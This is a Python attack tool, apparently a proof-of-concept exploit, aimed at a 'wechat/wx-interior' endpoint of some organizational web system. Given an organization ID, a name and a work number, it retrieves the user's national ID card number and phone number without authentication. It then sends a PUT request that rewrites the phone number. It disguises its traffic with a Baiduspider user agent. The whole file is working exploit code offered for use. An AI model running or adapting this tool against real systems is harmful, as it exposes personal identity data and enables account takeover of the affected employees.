#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests,json
from loguru import logger
import urllib.parse
Version = "@Мартин. NewLand Tool V1.0.0"
Logo=f'''
$$$$$$$$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\ 
\__$$  __|$$  __$$\ $$  __$$\ $$  __$$\ $$  _____|
   $$ |   $$ |  $$ |$$ /  $$ |$$ /  \__|$$ |      
   $$ |   $$$$$$$  |$$$$$$$$ |$$ |      $$$$$\    
   $$ |   $$  __$$< $$  __$$ |$$ |      $$  __|   
   $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |      
   $$ |   $$ |  $$ |$$ |  $$ |\$$$$$$  |$$$$$$$$\ 
   \__|   \__|  \__|\__|  \__| \______/ \________|    
                            {Version}  
'''
UA = {

    "User-Agent":"Mozilla / 5.0 ( Linux ; u ; Android 4.2.2 ; zh - cn ; ) AppleWebKit / 534.46 ( KHTML , likeGecko ) Version / 5.1 Mobile Safari / 10600.6.3 ( compatible ; Baiduspider / 2.0 ; + http : / / www . baidu . com / search / spider . html ) "
}

POC2 = {
"User-Agent":"Mozilla / 5.0 ( Linux ; u ; Android 4.2.2 ; zh - cn ; ) AppleWebKit / 534.46 ( KHTML , likeGecko ) Version / 5.1 Mobile Safari / 10600.6.3 ( compatible ; Baiduspider / 2.0 ; + http : / / www . baidu . com / search / spider . html ) "
,
"Content-Type": "application/json"
}


def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class Main_Class():
    def __init__(self,args):
        self.URL= args.URL
        self.NAME = args.NAME
        self.ID = args.ID
        self.ORGID = args.ORGID

    def run(self):
        if self.NAME and self.ID and self.URL and self.ORGID:
            logger.info(f"Retrieving users:{self.NAME}")
            self.Search()
        else:
            logger.error("You must fill in the correct parameters!")

    def Search(self):
        try:
            data = requests.get(self.URL+f"/wechat/wx-interior?organizationId={self.ORGID}&interiorName={self.NAME}&interiorWorkNo={self.ID}",headers=UA,timeout=2).json()
        except Exception as e:
            logger.error(f"Unable to obtain the user [{self.NAME}] information")
        else:
            if data['code'] == 0:
                logger.info("User_ID:"+data['data']['id']+" Name:"+data['data']['name']+" ID_Card:"+data['data']['idcard']+" Work_id:"+data['data']['workNo']+" Phone_number:"+data['data']['phoneNumber'])
                choice = input("Modify user information(y/n):")
                if choice.lower() == 'y':
                    self.Change(input(f"The phone number parameter option for user {self.NAME} will be modified to:"),data['data']['idcard'])
                else:
                    logger.warning("Exit")
                    sys.exit(0)
    def Change(self,note,sfz):
        POC = {
            "organizationId": f"{self.ORGID}",
            "workNo": f"{self.ID}",
            "name": f"{urllib.parse.quote(self.NAME, safe='')}",
            "photo": "",
            "phoneNumber": f"{note}",
            "hasChangePhoto": "",
            "idcard": f"{sfz}"
        }
        data = requests.put(self.URL + "/wechat/wx-interior", timeout=2,headers=POC2, data=json.dumps((POC))).json()
        if data['code'] == 0:
            logger.warning("Modified successfully!")
            self.Search()
        else:
            logger.error("Modification failed!")

            
def main():
    print(Logo)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Basic usage:
            python3 {MPHP} -url http://a.com -orgid x -name xxx -id xxxxx  
            '''.format(MPHP = sys.argv[0]
                )))
    parser.add_argument('-url', '--URL', default=None, help='URL')
    parser.add_argument('-name', '--NAME', default=None, help='Name')
    parser.add_argument('-id', '--ID',default=None, help='Id')
    parser.add_argument('-orgid', '--ORGID',default=1, help='OrgId')
    args = parser.parse_args()
    Main_Class(args).run()


if __name__ == '__main__':
    main()